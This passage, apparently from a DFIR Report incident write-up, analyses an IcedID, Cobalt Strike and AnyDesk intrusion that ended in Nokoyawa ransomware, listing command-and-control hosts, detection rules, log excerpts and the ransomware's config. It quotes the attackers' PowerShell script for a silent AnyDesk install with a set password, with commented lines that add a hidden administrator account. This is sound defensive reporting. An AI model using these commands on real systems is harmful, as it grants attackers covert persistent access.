<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30583" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-029.png" alt="" width="1389" height="191" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-029.png 1389w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-029-300x41.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-029-1024x141.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-029-768x106.png 768w" sizes="(max-width: 1389px) 100vw, 1389px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>On the beachhead, workstation files were opened with their &#8216;preferred&#8217; option: Word for .docx, Excel for .xlsx and Internet Explorer for .pdf.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30584" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-030.png" alt="" width="1745" height="511" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-030.png 1745w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-030-300x88.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-030-1024x300.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-030-768x225.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-030-1536x450.png 1536w" sizes="(max-width: 1745px) 100vw, 1745px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>While it is not always easy to get a full list of files a threat actor had specifically accessed, this time it was logged well in process activity.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On other machines, there was apparent interest in certain files, mainly related to possible passwords, PII and other financial data.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>The threat actors used three different ways to access the hosts within this network:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>IcedID</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Cobalt Strike</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>AnyDesk</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Below is an overview of each of the stages found during the intrusion.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>IcedID</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>IcedID uses multiple staged domains to deliver parts of its functionality. The IcedID DLL running in the rundll32 process immediately connected to its command and control server on port 80, using domain name aerilaponawki[.]com, which resolved at the time to 193.149.129.131. The contents of this network connection matched a malware rule in the free Emerging Threats Open ruleset ET MALWARE Win32/IcedID Request Cookie.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The IcedID process also connected to two other command and control servers by domain name, but both of these connections used TLS over port 443, so it was not possible for the network sensor to observe as much content or match as many network detection rules as it would have with TLS termination or unencrypted traffic. The connection to klindriverfor[.]com (5.255.102.167) on port 443 repeated about once every 10 minutes for 12 days. The connection to alishaskainz[.]com (45.61.139.206) on port 443 also repeated about once every 10 minutes for 28 days.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Below table shows an overview and function of each domain:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Domain</td>
<td>Usage</td>
<td>ISP</td>
<td>Location</td>
</tr>
<tr>
<td>193.149.129.131</td>
<td>80</td>
<td>aerilaponawki[.]com</td>
<td>First callout and primary C2 IcedID</td>
<td>BLNWX</td>
<td>NL</td>
</tr>
<tr>
<td>5.255.102.167</td>
<td>443</td>
<td>klindriverfor[.]com</td>
<td>Additional C2 IcedID</td>
<td>The Infrastructure Group</td>
<td>NL</td>
</tr>
<tr>
<td>45.61.139.206</td>
<td>443</td>
<td>alishaskainz[.]com</td>
<td>Additional C2 IcedID</td>
<td>BL Networks GB</td>
<td>GB</td>
</tr>
<tr>
<td>5.255.105.55</td>
<td>443</td>
<td>halicopnow[.]com</td>
<td>Additonal C2 IcedID</td>
<td>The Infrastructure Group</td>
<td>NL</td>
</tr>
</tbody>
</table>
</figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>For each of the domains, an overview of the relevant rules that can be used (in combination) to look for IcedID behavior:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>aerilaponawki[.]com:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>ET MALWARE Win32/IcedID Request Cookie</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>klindriverfor[.]com:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0)</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>alishaskainz[.]com:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0)</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>halicopnow[.]com:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>ET POLICY OpenSSL Demo CA - Internet Widgits Pty (0)</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>When looking for additional strange network connections, we can find these two gathered from a memory dump of the compromised systems. The connection from rundll32.exe is especially interesting and is related to our IcedID infection. It appears to be a different IP for one of the previously found command and control domains.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30585" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-031.png" alt="" width="890" height="34" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-031.png 890w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-031-300x11.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-031-768x29.png 768w" sizes="(max-width: 890px) 100vw, 890px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:table -->
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Domain</td>
<td>Usage</td>
<td>ISP</td>
<td>Location</td>
</tr>
<tr>
<td>162.33.178.40</td>
<td>443</td>
<td>alishaskainz[.]com</td>
<td>Additional C2 IcedID</td>
<td>BL Networks GB</td>
<td>GB</td>
</tr>
</tbody>
</table>
</figure>
<!-- /wp:table -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading"> </h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>Cobalt Strike</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The Cobalt Strike beacons which were used during the intrusion were named:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><code>agaloz.dll</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>Funa2.exe / csrss.exe</code></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>They contain a configuration to contact the below command and control server:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Domain</td>
<td>Usage</td>
<td>ISP</td>
<td>Location</td>
</tr>
<tr>
<td>91.215.85.183</td>
<td>msc-mvc-updates[.]com</td>
<td>Cobalt Strike C2</td>
<td>Prospero Ooo</td>
<td>RU</td>
</tr>
</tbody>
</table>
<p>Suricata reported hits for &#8216;<a href="https://github.com/rsmudge/Malleable-C2-Profiles/" target="_blank" rel="noreferrer noopener">Malleable&#8217; profiles</a> used by the Cobalt Strike beacon. These profiles are preconfigurable and are mostly used to &#8216;mimic&#8217; known traffic of different applications, such as a mail client, chat client, or a JavaScript library. The rule that hits, can be seen in the first screenshot below.</p>
</figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30586" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-032.png" alt="" width="571" height="181" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-032.png 571w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-032-300x95.png 300w" sizes="(max-width: 571px) 100vw, 571px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The second screenshot shows the actual configured portion of the profile, which appears very similar to <a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/gmail.profile" target="_blank" rel="noreferrer noopener">this &#8220;gmail&#8221; profile</a>. Communication goes via the URI:</p>
<pre>/_/scs/mail-static/_js/</pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30587" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-033.png" alt="" width="780" height="340" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-033.png 780w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-033-300x131.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-033-768x335.png 768w" sizes="(max-width: 780px) 100vw, 780px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph --><!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The DFIR Report Threat Intel Team picked up this Cobalt Strike server on January 9th, 2023, weeks before the intrusion. On that day, the beacon profile resembled a freely available <a href="https://github.com/threatexpress/malleable-c2/blob/a08f7b2c0e9ad70fc5bdbda5acac97b1152d54b8/jquery-c2.4.0.profile#L445" target="_blank" rel="noopener">malleable C2 profile that mimics jquery</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/1.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-30716 size-full" src="https://thedfirreport.com/wp-content/uploads/2024/03/1.png" alt="" width="741" height="547" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/1.png 741w, https://thedfirreport.com/wp-content/uploads/2024/03/1-300x221.png 300w" sizes="(max-width: 741px) 100vw, 741px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The command and control server appears to have been in use through at least April 2024 with a different Cobalt Strike beacon reported to the <a href="https://tria.ge/230410-tp4xzsef29" target="_blank" rel="noreferrer noopener">Triage</a> malware sandboxing service using the same gmail-like profile and remote IP as observed in this intrusion.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30590" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-036.png" alt="" width="1205" height="838" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-036.png 1205w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-036-300x209.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-036-1024x712.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-036-768x534.png 768w" sizes="(max-width: 1205px) 100vw, 1205px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>With that said, it appears Microsoft took over this domain on April 6, 2023 when DNS was switched from Cloudflare to MICROSOFTINTERNETSAFETY.NET and the domain started resolving to 20.69.178.82 (Microsoft).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/34.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-30722 size-full" src="https://thedfirreport.com/wp-content/uploads/2024/03/34.png" alt="" width="258" height="170" /></a></p>
<p>We can see the registration information was updated (date showing last updated) as well:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/23.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-30718 size-full" src="https://thedfirreport.com/wp-content/uploads/2024/03/23.png" alt="" width="730" height="437" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/23.png 730w, https://thedfirreport.com/wp-content/uploads/2024/03/23-300x180.png 300w" sizes="(max-width: 730px) 100vw, 730px" /></a></p>
<p>We were also able to locate the <a href="https://noticeofpleadings.com/crackedcobaltstrike/files/ComplaintAndSummons/1%20-Microsoft%20Cobalt%20Strike%20-%20Complaint(907040021.9).pdf" target="_blank" rel="noopener">complaint</a> by Microsoft, Fortra and Health-ISAC to acquire this domain:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/plantiff.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-30719 size-full" src="https://thedfirreport.com/wp-content/uploads/2024/03/plantiff.png" alt="" width="639" height="179" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/plantiff.png 639w, https://thedfirreport.com/wp-content/uploads/2024/03/plantiff-300x84.png 300w" sizes="(max-width: 639px) 100vw, 639px" /></a></p>
<p>Here&#8217;s an outtake of the domain and registration information from the <a href="https://noticeofpleadings.com/crackedcobaltstrike/files/ComplaintAndSummons/1%20-Microsoft%20Cobalt%20Strike%20-%20Complaint(907040021.9).pdf" target="_blank" rel="noopener">complaint</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/33.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-30720 size-full" src="https://thedfirreport.com/wp-content/uploads/2024/03/33.png" alt="" width="569" height="646" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/33.png 569w, https://thedfirreport.com/wp-content/uploads/2024/03/33-264x300.png 264w" sizes="(max-width: 569px) 100vw, 569px" /></a></p>
<p>According to The DFIR Report&#8217;s Threat Intel Team, the IP was observed hosting Cobalt Strike through June 3, 2023.</p>
<p>After initial deployment, the threat actors downloaded additional beacons, all of which have a parent process of the executable called <code>Funa2.exe</code>. It appears that the .dll likely didn&#8217;t work as expected, as five minutes later an .exe with the same name gets downloaded.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DLL download attempt:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30591" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-037.png" alt="" width="700" height="284" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-037.png 700w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-037-300x122.png 300w" sizes="(max-width: 700px) 100vw, 700px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Change to EXE download:</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading"><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30592" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-038.png" alt="" width="752" height="281" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-038.png 752w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-038-300x112.png 300w" sizes="(max-width: 752px) 100vw, 752px" /></a></h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Shortly after, we find the first connection to the server using the malleable profile paths:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30593" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-039.png" alt="" width="758" height="392" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-039.png 758w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-039-300x155.png 300w" sizes="(max-width: 758px) 100vw, 758px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>AnyDesk</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>During later stages of the intrusion, the threat actors deployed AnyDesk using a PowerShell script copied under <code>C:\ProgramData\INSTALL.ps1</code>. In addition, the copied PowerShell script was executed on multiple systems to facilitate the deployment of AnyDesk using the following commands: </p>
<pre>    mkdir "C:\ProgramData\Any"
    # Download AnyDesk
    $clnt = new-object System.Net.WebClient
    $url = "http://download.anydesk.com/AnyDesk.exe"
    $file = "C:\ProgramData\AnyDesk.exe"
    $clnt.DownloadFile($url,$file)


    cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\Any --start-with-win --silent


    cmd.exe /c echo btc1000qwe123 | C:\ProgramData\Any\AnyDesk.exe --set-password


    #net user AD "2020" /add
    #net localgroup Administrators InnLine /ADD
    #reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v InnLine /t REG_DWORD /d 0 /f
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This install script appears to be similar to the previously <a href="https://twitter.com/TheDFIRReport/status/1498672358843953152" target="_blank" rel="noreferrer noopener">leaked powershell script used by Conti</a>:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30745" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-053.png" alt="" width="1017" height="531" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-053.png 1017w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-053-300x157.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-053-768x401.png 768w" sizes="(max-width: 1017px) 100vw, 1017px" /></a></p>
<p>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>AnyDesk can be used, either as an installed service (as we can see above) or it can use a portable version. The differences and limitations are written on the official site of <a href="https://support.anydesk.com/knowledge/portable-vs-installed" target="_blank" rel="noreferrer noopener">AnyDesk</a>. As we are dealing with the &#8216;installed&#8217; version, it will leave certain artifacts related to the installed version on the system. Multiple people have written about AnyDesk artifacts, such as <a href="https://www.inversecos.com/2021/02/forensic-analysis-of-anydesk-logs.html" target="_blank" rel="noreferrer noopener">Inversecos</a> or <a href="https://medium.com/@tylerbrozek/anydesk-forensics-anydesk-log-analysis-b77ea37b90f1" target="_blank" rel="noreferrer noopener">TylerBrozek</a>, which help a lot during the forensic process related to Anydesk artifacts.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For the <code>ad_svc.trace</code> we can find entries like this:</p>
<pre>info REDACTED       gsvc   6600  11452   26                anynet.any_socket - Client-ID: 485343132 (FPR: 9805919074ee).
info REDACTED       gsvc   6600  11452   46                anynet.any_socket - Logged in from 152.89.196.49:61384 on relay a541c14e
info REDACTED       gsvc  10136   2256 2515                anynet.any_socket - Client-ID: 547283332 (FPR: 17e2ee445059).
info REDACTED       gsvc  10136   2256 2515                anynet.any_socket - :54241 on relay ffe9a90c.
</pre>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Usage</td>
<td>ISP</td>
<td>Country</td>
<td>AnyDesk Client ID</td>
</tr>
<tr>
<td>152.89.196.49</td>
<td>AnyDesk Interactive</td>
<td>Starcrecium Limited</td>
<td>RU</td>
<td>485343132</td>
</tr>
<tr>
<td>185.29.9.162</td>
<td>AnyDesk Interactive</td>
<td>DataClub</td>
<td>SE</td>
<td>547283332</td>
</tr>
</tbody>
</table>
</figure>
<!-- /wp:table -->

<!-- wp:heading -->
<h2 id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>After the threat actors gained access to a file server in the domain, they quickly prepared this machine for exfiltration. This was performed by downloading the Filezilla FTP client installer using internet explorer on the server. The threat actors were so kind to use the sponsored version, to bring some additional PUP&#8217;s as well:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30595" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-041.png" alt="" width="1468" height="350" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-041.png 1468w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-041-300x72.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-041-1024x244.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-041-768x183.png 768w" sizes="(max-width: 1468px) 100vw, 1468px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30596" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-042.png" alt="" width="1325" height="293" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-042.png 1325w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-042-300x66.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-042-1024x226.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-042-768x170.png 768w" sizes="(max-width: 1325px) 100vw, 1325px" /></a></p>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Shortly after, the threat actors connected from the file server, using FileZilla, to 45.155.204.5 via SSH and key exchange can be observed in the network traffic:</p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Usage</td>
<td>ISP</td>
<td>Country</td>
<td>SSH Info:</td>
</tr>
<tr>
<td>45.155.204.5</td>
<td>SSH for FileZilla</td>
<td>3NT Solutions LLP</td>
<td>RU</td>
<td><strong>Hash</strong>: c561c2cdad206b6ed8469079e037e3f9<strong>SSH Version</strong>: ssh-2.0-filezilla_3.63.2.1</td>
</tr>
</tbody>
</table>
</figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p>FileZilla <em>can </em>leave behind some nice forensics artifacts (if the installation is not removed). Writing in this blog by <a href="https://forensafe.com/blogs/filezilla.html" target="_blank" rel="noreferrer noopener">Artifast</a>, a nice overview can be seen. In this case, we were able to recover part of the <code>.xml</code> files resulting in the below correlation between the network data and the host data. While each separate source was already a good finding on its own, this combination leaves less room for guessing.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30597" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-043.png" alt="" width="701" height="297" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-043.png 701w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-043-300x127.png 300w" sizes="(max-width: 701px) 100vw, 701px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30598" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-044.png" alt="" width="1233" height="273" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-044.png 1233w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-044-300x66.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-044-1024x227.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-044-768x170.png 768w" sizes="(max-width: 1233px) 100vw, 1233px" /></a></p>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Thirty-four days after the first infection, and about 28 hours after the beginning of hands-on activity, the threat actors proceeded to their final actions, deploying Nokayawa ransomware. The variant of Nokoyawa was similar to those we&#8217;ve already <a href="https://thedfirreport.com/?s=nokoyawa" target="_blank" rel="noreferrer noopener">reported on</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>As in most ransomware related cases, before actual deployment, the threat actors looked around to gather information related to backup functionality and systems. In this case, the threat actors moved around between a file server and a backup server, making and viewing configurations, dropping and &#8216;debugging&#8217; the ransomware and finally cleaning up.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The threat actors started by using <em>mmc.exe</em> to look into the Local Group Policy by using <em>gpedit.msc. </em>Around 20 minutes later, the threat actors started executing the ransomware script on the file server.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30599" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-045.png" alt="" width="1871" height="396" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-045.png 1871w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-045-300x63.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-045-1024x217.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-045-768x163.png 768w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-045-1536x325.png 1536w" sizes="(max-width: 1871px) 100vw, 1871px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The ransomware files, in this case <code>svchost.exe</code> and an &#8216;automation&#8217; file <code>[REDACTED].1.bat</code>, were delivered via the AnyDesk sessions as parent process.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30600" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-046.png" alt="" width="1138" height="353" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-046.png 1138w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-046-300x93.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-046-1024x318.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-046-768x238.png 768w" sizes="(max-width: 1138px) 100vw, 1138px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The batch script, <code>[REDACTED].1.bat</code>, launched the executable <code>svchost.exe</code> with a <code>--config</code> parameter, containing a base64 encoded string:</p>
<pre>{
EXTENSION: "NOKONOKO",
NOTE_NAME: "NOKONOKO-readme.txt",
NOTE_CONTENT: "&lt;BASE64 ENCODED NOTEBLOB&gt;",
ECC_PUBLIC: "AHpyfaG1ftdE4NNQ0laC2825GOpTwUw5Y9+WEMkAAAC0Yd7VSOy7D5CxWhHH4pzSYdCXjpPXqEZ2X2r6kgEAAA==",
SKIP_DIRS: [
"windows",
"program files",
"program files (x86)",
"appdata",
"programdata",
"system volume information"
],
SKIP_EXTS: [
".exe",
".dll",
".ini",
".lnk",
".url"
],
ENCRYPT_NETWORK: true,
LOAD_HIDDEN_DRIVES: true,
DELETE_SHADOW: true
}
</pre>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>After the execution on the file server, the threat actors moved to the backup server, where they repeated their interest in the Group Policy. On the backup server, they also opened the server configuration. There appeared to be a problem, as there was some &#8216;file locking&#8217; in place, likely preventing access. The threat actors tried to circumvent these &#8216;locks&#8217; by utilizing a tool called <a href="https://www.iobit.com/" target="_blank" rel="noreferrer noopener">IOBit</a>. This tool is capable of removing file locks.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/03/19772-047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-30601" src="https://thedfirreport.com/wp-content/uploads/2024/03/19772-047.png" alt="" width="1136" height="78" srcset="https://thedfirreport.com/wp-content/uploads/2024/03/19772-047.png 1136w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-047-300x21.png 300w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-047-1024x70.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/03/19772-047-768x53.png 768w" sizes="(max-width: 1136px) 100vw, 1136px" /></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>After this, the ransomware was deployed in the same manner as on the file server. However, there appeared to be a problem with the deployment. The threat actors started <em><a href="https://processhacker.sourceforge.io/" target="_blank" rel="noreferrer noopener">ProcessHacker</a> </em>and utilized <em>notepad++ </em>to <strong><em>likely</em></strong> fix something related to the ransomware execution. This is based on the fact that, the threat actors executed the ransomware binary 11 times on the backup server and afterwards returned and executed the ransomware a second time on the file server. </p>
